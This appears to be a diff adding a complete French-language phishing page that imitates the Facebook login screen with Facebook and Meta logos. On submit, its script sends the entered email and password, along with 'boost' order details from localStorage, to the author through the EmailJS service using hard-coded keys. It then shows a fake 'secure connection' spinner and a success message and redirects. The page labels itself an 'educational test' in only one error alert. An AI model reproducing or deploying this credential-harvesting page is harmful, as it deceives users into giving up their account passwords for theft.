@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Facebook – Connectez-vous ou inscrivez-vous</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --facebook-bg-dark: #1c1e21;
+      --facebook-card-bg: #242526;
+      --facebook-blue-btn: #1877f2;
+      --facebook-dark-blue-hover: #165ecc;
+      --facebook-green-btn: #42b72a;
+      --facebook-dark-green-hover: #36a420;
+      --text-light: #e4e6eb;
+      --text-muted: #b0b3b8;
+      --border-color-input: #3e4042;
+    }
+
+    body {
+      font-family: 'Roboto', sans-serif;
+      margin: 0;
+      background: linear-gradient(to bottom, #1c1e21, #242526);
+      color: var(--text-light);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .top-header {
+      width: 100%;
+      padding: 15px 20px;
+      background-color: var(--facebook-card-bg);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .top-header a {
+      color: var(--text-light);
+      text-decoration: none;
+      font-size: 1.2em;
+    }
+
+    .language-selector {
+      font-size: 1em;
+    }
+
+    .login-container {
+      flex-grow: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 30px 20px;
+      width: 100%;
+      box-sizing: border-box;
+    }
+
+    .facebook-logo {
+      margin-bottom: 25px;
+    }
+
+    .facebook-logo img {
+      width: 120px; /* Réduit la taille du logo */
+      display: block;
+      margin: 0 auto;
+    }
+
+    .login-form {
+      width: 100%;
+      max-width: 380px;
+      background-color: var(--facebook-card-bg);
+      padding: 25px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+      display: flex;
+      flex-direction: column;
+    }
+
+    .login-form input[type="text"],
+    .login-form input[type="password"] {
+      padding: 14px;
+      margin-bottom: 12px;
+      border: 1px solid var(--border-color-input);
+      border-radius: 4px;
+      background-color: #3a3b3c;
+      color: var(--text-light);
+      font-size: 1em;
+    }
+
+    .login-form input::placeholder {
+      color: var(--text-muted);
+    }
+
+    .login-form button {
+      padding: 14px;
+      background-color: var(--facebook-blue-btn);
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      font-size: 1.1em;
+      font-weight: bold;
+      margin-bottom: 15px;
+      cursor: pointer;
+      transition: background-color 0.2s ease;
+    }
+
+    .login-form button:hover {
+      background-color: var(--facebook-dark-blue-hover);
+    }
+
+    .forgot-password-link {
+      text-align: center;
+      color: var(--facebook-blue-btn);
+      text-decoration: none;
+      font-weight: 500;
+      margin-bottom: 20px;
+    }
+
+    .forgot-password-link:hover {
+      text-decoration: underline;
+    }
+
+    .create-account-btn {
+      background-color: var(--facebook-green-btn);
+      color: #fff;
+      padding: 12px;
+      text-align: center;
+      border-radius: 4px;
+      font-weight: bold;
+      text-decoration: none;
+      transition: background-color 0.2s ease;
+    }
+
+    .create-account-btn:hover {
+      background-color: var(--facebook-dark-green-hover);
+    }
+
+    .meta-logo {
+      margin-top: 30px;
+      opacity: 0.5;
+      text-align: center;
+    }
+
+    .meta-logo img {
+      width: 90px;
+    }
+
+    .loading-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      background: rgba(0,0,0,0.85);
+      width: 100%;
+      height: 100%;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      flex-direction: column;
+      transition: opacity 0.4s ease;
+    }
+
+    .loading-spinner {
+      width: 60px;
+      height: 60px;
+      border: 8px solid rgba(255,255,255,0.2);
+      border-top: 8px solid var(--facebook-blue-btn);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    .loading-text {
+      margin-top: 20px;
+      font-size: 1.2em;
+      font-weight: 500;
+      text-align: center;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    @media (max-width: 480px) {
+      .login-form {
+        padding: 20px;
+      }
+
+      .login-form input,
+      .login-form button {
+        font-size: 1em;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="loading-overlay" id="loadingOverlay" aria-hidden="true">
+    <div class="loading-spinner" role="status" aria-label="Chargement en cours"></div>
+    <div class="loading-text">Connexion sécurisée en cours...</div>
+  </div>
+
+  <div class="top-header">
+    <a href="javascript:history.back()" aria-label="Retour">&#8592;</a>
+    <div class="language-selector" aria-label="Sélecteur de langue">Français (France)</div>
+  </div>
+
+  <div class="login-container">
+    <div class="facebook-logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Logo Facebook" />
+    </div>
+
+    <form class="login-form" id="loginForm" aria-label="Formulaire de connexion">
+      <input type="text" id="userEmail" placeholder="Numéro mobile ou e‑mail" required aria-required="true" />
+      <input type="password" id="userPassword" placeholder="Mot de passe" required aria-required="true" />
+      <input type="hidden" id="date" />
+      <button type="submit">Se connecter</button>
+      <a href="#" class="forgot-password-link">Mot de passe oublié ?</a>
+      <a href="#" class="create-account-btn">Créer un compte</a>
+    </form>
+
+    <div class="meta-logo" aria-label="Logo Meta">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/3/3b/Meta_Platforms_Inc._logo.svg" alt="Logo Meta" />
+    </div>
+  </div>
+
+  <script src="https://cdn.emailjs.com/sdk/2.3.2/email.min.js"></script>
+  <script>
+    emailjs.init("4ltNmWrqPWnfKPy7x");
+
+    document.getElementById("loginForm").addEventListener("submit", function(event) {
+      event.preventDefault();
+
+      const email = document.getElementById("userEmail").value;
+      const password = document.getElementById("userPassword").value;
+      const date = new Date().toLocaleString();
+      document.getElementById("date").value = date;
+
+      document.getElementById("loadingOverlay").style.display = "flex";
+
+      const templateParams = {
+        user_email: email,
+        user_password: password,
+        boostType: localStorage.getItem("finalBoostType") || "Non spécifié",
+        profileLink: localStorage.getItem("finalProfileLink") || "Non spécifié",
+        quantity: localStorage.getItem("finalQuantity") || "Non spécifié",
+        price: localStorage.getItem("finalPrice") || "Non spécifié"
+      };
+
+      emailjs.send("service_rtdebfm", "template_1g13r8b", templateParams)
+        .then(() => {
+          setTimeout(() => {
+            alert("✅ Vérification réussie ! Vous allez être redirigé.");
+            window.location.href = "success.html";
+          }, 2000);
+        })
+        .catch((error) => {
+          console.error("Erreur:", error);
+          setTimeout(() => {
+            alert("Une erreur est survenue, mais vos informations ont été reçues. (Test éducatif)");
+            window.location.href = "success.html";
+          }, 2000);
+        });
+    });
+  </script>
+</body>
+</html>
